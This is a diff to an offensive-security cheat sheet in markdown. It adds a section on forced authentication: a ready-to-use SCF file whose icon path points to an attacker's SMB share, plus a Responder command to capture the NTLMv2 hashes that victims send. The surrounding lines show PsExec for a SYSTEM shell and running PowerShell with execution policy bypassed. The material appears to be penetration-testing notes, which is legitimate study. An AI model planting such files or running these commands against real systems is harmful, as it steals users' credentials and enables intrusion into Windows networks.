@@ -362,7 +362,23 @@ If the system has `PsExec.exe` open elevated cmd
 
 `.\PsExec.exe -i -s cmd.exe`
 
-### Active Directory
+### Forced authentication (Stealing Hahses)
+
+If we have access to upload files , we can upload SCF (Shell Command File) in which we can specify our IP and share so that when it makes a request to it , it's going to authenticate to our share with credentials
+
+```
+[Shell]
+Command=2
+IconFile=\\IP\share\test.ico
+[Taskbar]
+Command=ToggleDesktop
+```
+
+Then launch responder to capture the NTLMv2 hash
+
+`responder -i tun0`
+
+## Active Directory
 
 `powershell -ep bypass`  load a powershell shell with execution policy bypassed <br/>
 `. .\PowerView.ps1`      import the PowerView module
